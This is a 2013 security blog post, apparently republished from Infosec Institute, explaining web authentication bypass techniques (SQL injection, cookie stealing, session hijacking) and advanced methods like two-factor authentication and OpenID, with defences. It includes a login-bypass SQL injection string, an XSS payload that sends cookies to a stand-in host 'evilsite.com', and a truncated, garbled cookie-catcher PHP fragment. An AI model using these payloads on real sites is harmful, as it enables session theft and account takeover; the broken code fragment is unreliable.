---
layout: post
title: "Hacking Web Authentication – Part 2"
date: 2013-06-12 05:03
comments: true
categories: [security, authentication, burpsuite]
---

[In the first part of this article](http://highaltitudehacks.com/blog/2013/06/12/hacking-web-authentication-part-1/) we looked at some of the common authentication types used in Web Applications these days and discussed their pros and cons. In this article we take it one step further and discuss some of the advanced authentication methods used these days. We will also discuss the various techniques for bypassing web based authentication, and discuss the steps needed to avoid such kinds of vulnerabilities. Overall this article will be divided into two sections.

<!--more-->

## A) Bypassing Authentication

1.  SQL Injection
2.  Cookie Stealing
3.  Session Hijacking

## B) Advanced Authentication Methods

1.  Certificate Based Authentication
2.  Two-Factor Authentication
3.  Open ID

## Bypassing Authentication

Bypassing authentication is one of the most useful techniques as it does not require us to know the user's credentials in order to access the user's profile. This technique however does not work with HTML-Basic authentication type because, as we remember from the first part of this article, HTML-Basic requires us to send the username and password with every request.

**a) SQL Injection**- This technique is valid in cases when the user's credentials are processed at the backend in an SQL statement. If the user's input is not validated properly, then the attacker has the capability to inject the SQL statement with malicious queries which will allow him to bypass the authentication.

Let's say the SQL statement which is responsible for validating the input sent by the user looks something like this. The _Username_ and _Password_ are the values of the username and password passed by the user which is then sent to this SQL Statement without input validation.

<pre>SELECT * FROM USER_TABLE WHERE USERNAME = 'Username' and PASSWORD = 'Password';</pre>

Let's say the user enters the username as _admin' OR 1=1 --_ and the password as _blah_.

The SQL query will look like this now.

<pre>SELECT * FROM USER_TABLE WHERE USERNAME = 'admin' OR 1=1 --' and PASSWORD = 'blah';</pre>

If we look closely at the SQL statement, the statement will only get executed till the following line as all the other characters are commented out because of the dashes "--".

<pre>SELECT * FROM USER_TABLE WHERE USERNAME = 'admin' OR 1=1 --</pre>

Hence the SQL statement selects the user admin if a user with the username "admin" is available in its database otherwise it just returns the first user in the database because the BOOL value of the statement evaluates to TRUE. Hence there was no use of any password in this case. Input validation must be done in order to protect from SQL Injection. Note that SQL Injection in itself is a very massive topic and the case discussed in this article in one of the most simplest forms of SQL Injection. Also note that it is not necessary that the credentials are always validated in the backend with a SQL statement, in which case SQL Injection will not work.

**b) Cookie Stealing**-Cookies are another source of valuable information that is stored on the user's computer. Cookies can include valuable information about the user, which could be the user/pass in encoded or encrypted format, the session ID value etc. As far as web authentication is concerned, cookies can be a valuable resource in maintaining the state between the user and the website. A good example of this is a web application which sets a cookie on the user's system once the user logs in successfully. For all the subsequent requests the user doesn't have to send his credentials now as long as the cookie doesn't expire. However this could be a security issue. The problem is that in an open unencrypted network, it is very easy to capture the cookie's of various users using packet sniffing tools like Wireshark etc. Once the attacker has the cookie, he can use that cookie to impersonate the user. To protect the victim from getting compromised because of these risks, there are different flags that can be set on the server side for issuing cookies to the user.

**Secure Flag**- This flag ensures that the cookie is never transmitted over an unencrypted channel and should always be passed from the client to the server over a secure channel (HTTPS). This flag is very useful as it protects the victim from eavesdropping attacks.

**Http-Only Flag**- This feature ensures that the Cookie is not accessible from any non-Http Api's. This prevents the victim from cookie stealing attacks where the attacker can use javascript to directly access the sessions cookies. Note that this method is not completely foolproof but provides a decent level of security and hence should be used whenever needed.

Note that not all the values in a cookie are related to maintaining the user's session with the website. Some of them could just be used to monitor the user's activities or for some other reasons. Let's do a quick dissection of the cookies set on our system while using Facebook. I will be using the Firefox Add-on _Cookie Manager_ to view the cookies set by Facebook. It is a very handy add-on for monitoring and changing cookies.

![Screen Shot 2012 01 15 At 5.58.25 PM]({{site.baseurl}}/images/posts/webauth2//Screen Shot 2012-01-15 at 5.58.25 PM.png)

As we can see there are a number of name-value pairs in the cookies stored by facebook on our system. Also, not all of them are related to the user's session. In my case i modified the cookie value with the name "s" and found out that i was still able to browse through facebook, hence the session was still maintained. But when i modified the cookie value with the name "c_user", and tried to surf pages across facebook i found out that i was logged out, i.e the session state was broken and i had to reenter my credentials.

There could be a number of ways for stealing cookies. In this case i will be discussing the technique of stealing cookies by exploiting an XSS vulnerability in the application. As we know that XSS allows us to execute a script on the victim's browser. Let's say we execute the following script on the victim machine.

<xmp><script>document.location='http://evilsite.com?cookie=<script>document.cookie</script>'</script></xmp>

What we are doing is accessing the user's cookie via javascript and passing it to an external website which stores the cookies of the user. Note that in order to access the cookie via Javascript, the HTTP-Only flag should not be set in the Cookie. Once the attacker has the user's cookies, he can enter the cookie values in his own browser by using tools like "Cookie Manager" etc and hence impersonate the user. Note that this method will work only if the website uses cookies for maintaining the session state between the client and the browser. On the evil site, we could have some php code that will receive the cookie and store it in a file.

Here is what the code for the Cookie Catcher file looks like.

``` IP: ' .$ip. '  
Date and Time: ' .$date. '  
Referer: '.$referer.'  

'); fclose($fp); //Redirect the user to google.com header ("Location: http://www.google.com"); ?> ```

This type of attack can be prevented by using appropriate flags (Secure and HTTP-only) for cookies whenever needed. Use of encoding should be avoided in cookies as it is trivial to decode the cookies to get back the original value. Instead encryption should be used in cookies which will prevent it from eavesdropping attacks even in an open and unencrypted network.

**c) Session Hijacking**- In many cases a user who has authenticated successfully to a website is provided with a token value, or a session ID. This ID is used by the user while making subsequent requests to the website. In case the attacker is able to get the session ID, it is possible to impersonate the client depending on the security mechanisms deployed by the website. There are many ways of obtaining this session ID, sometimes the session ID is stored in the cookie and hence could be obtained by using the Cookie Stealing attacks as discussed earlier. In some cases, the session ID is passed as a query parameter, i.e in the URL. If an attacker has control of any proxy in between the client and the website, it is very easy for him to access the url from the logs and thus get the Session ID. In case the range of the Session ID's is known, it is also possible to brute force the session ID using Burpsuite as we did in part 1 of this article, the only difference now being that the parameter we are changing is the session ID.

The following screenshot shows the session ID passed in a request to the application DVWA. Using Burpsuite it is possible to brute force with the session ID as the changing parameter. To learn more on how to brute force using Burp, refer to the [Part 1](http://resources.infosecinstitute.com/authentication-hacking-pt1/) of this article.

![Screen Shot 2012 01 16 At 1.17.54 PM]({{site.baseurl}}/images/posts/webauth2//Screen shot 2012-01-16 at 1.17.54 PM.png)

There are various ways in which the attacker can steal the session of the victim. One of these methods is called a Session Fixation attack. In this attack, the attacker can control the session ID which a user will obtain once the user logs in to a particular website. He can do this by making the user click on a link with a specific session id, for e.g the url could be site.com?session_id=3ejn324n23j423n3 . Once the user logs in, he is given the session id "3ejn324n23j423n3". The attacker can now simply impersonate the victim by using the same Session ID. Note that this method will only work in cases when only the Session ID parameter is used to authenticate the victim. If some other parameter like the Ip-address, Mac address etc is used to validate the victim too, this method will not work.

These kind of attacks can be prevented by using session ID's that are long, complex and are not easily predicatable. Also the session ID's should have a very large keyspace, which will make brute force attacks less likely to be successful.

## Advanced Authentication Methods

With the increase in security awareness among people over the last few years, a number of new authentication methods have been deployed. In this section, we will be discussing some of the most popular ones.

**a) Two-Factor Authentication**-A Two factor authentication involves the use of 2 different kinds of evidence to authenticate a person. Please note that these 2 different kinds of evidence should be completely independent of each other. These 2 factors can be defined in terms of _"Something you have"_ and _"Something you know"_. An example of a two-factor authentication is a biometric authentication asking the users to provide their fingerprint and then asking them to enter their password. In this case the password goes under the category "Something you know" whereas the fingerprint goes under the category "Something you have". In some cases, hardware tokens are provided to the user as a second factor for authentication.However implementation and support for hardware tokens are very costly, and hence most banking companies do not support this. It would be better to atleast give the user an option to choose whether he wants to use two-factor authentication or not and then charge the amount from him in case he wants it.

However there are other methods for providing two-factor authentication which are not that expensive. Use of One Time passwords is one such example. Some of the service providers ask the user to enter a One Time Password (OTP) each time the user logs in to use their service. This One Time Password is sent either via a text message or a voice call to their mobile phones. Hence the role of hardware tokens is now taken up by the user's mobile phone.Two-Factor Authentication is still vulnerable to Man in the Middle attacks, where an attacker can set up a malicious website and once the user enters his credentials, a request is made to the actual website via the attacker. If properly executed, the user will never know that he is not at the original site.

**b) Certificate Based Authentication**-Certificate Based Authentication is one of the most popular authentication methods used these days. It involves the use of a digital certificate to authenticate a user. Users are prompted to install a unique certificate on their system the first time the user uses a service. So when the user browses to that service again, the service will query the user PC for that unique certificate. If the certificate is valid, then the service will grant access to the user. In some cases, certificate based authentication is used with regular password based authentication method to provide a two-factor authentication which adds an extra layer of security. This is because the certificate is something that the user should have and the password is something that the user should know.

**c) Open ID**- During the last few years, many websites have started delegating the responsibility of authentication to external authentication service providers. An example of this is the Windows Live ID which allows a user to sign onto multiple websites with the same account. However the most popular authentication service provider is Open ID. Once a user has an Open ID account, he can log on to all the websites that supports Open ID authentication using only one username/password combination.Open ID is supported by many popular websites like Google, Yahoo, Facebook, AOL etc. To create an Open ID we must register an account with an Open ID provider. Some of the popular Open ID providers are MyOpenId, Yahoo etc. It is an important to choose a good Open ID provider as they will be the ones managing our credentials.

One thing to note that here is that only the Open ID provider can see our password and that the Open ID provider is responsible for communicating with the website and asking it to identify us as a valid user. Some security concerns have been raised in the past over the security that Open ID provides. The problem is, if your Open ID username/password is compromised by an attacker, then it can reveal your whole online information. The attacker can then log on to all the websites that you use with your Open ID. Hence the convenience caused by Open ID does come at a cost. More information about Open ID can be found [here](http://openid.net/).

## Conclusion

In this article we looked at some of the advanced authentication techniques used these days, namely Two-Factor Authentication, Certificate Based Authentication and Open ID. We discussed the pros and cons of each of these techniques. We also discussed various methods of Bypassing authentication like SQL Injection, Cookie Stealing and Session Hijacking. No one method of authentication is the best, however using some of the advanced authentication methods will always decrease the chances of our personal information getting compromised.

## References

1.  OpenID Foundation Website  
    [http://openid.net](http://openid.net)

2.  Two-Factor Authentication  
    [http://http://en.wikipedia.org/wiki/Two-factor_authentication](http://en.wikipedia.org/wiki/Two-factor_authentication)

3.  Session Hijacking attack  
    [https://www.owasp.org/index.php/Session_hijacking_attack](https://www.owasp.org/index.php/Session_hijacking_attack)

4.  HTTP Cookie  
    [http://en.wikipedia.org/wiki/HTTP_cookie](http://en.wikipedia.org/wiki/HTTP_cookie)

5.  Public Key Certificate  
    [http://en.wikipedia.org/wiki/Public_key_certificate](http://en.wikipedia.org/wiki/Public_key_certificate)

6.  Advanced sign-in security for your google account  
    [http://googleblog.blogspot.com/2011/02/advanced-sign-in-security-for-your.html](http://googleblog.blogspot.com/2011/02/advanced-sign-in-security-for-your.html)

This article was originally published on the [resources](http://resources.infosecinstitute.com/) page at [Infosec Institute](http://infosecinstitute.com/). For more information, please visit my author [page](http://resources.infosecinstitute.com/author/prateek/).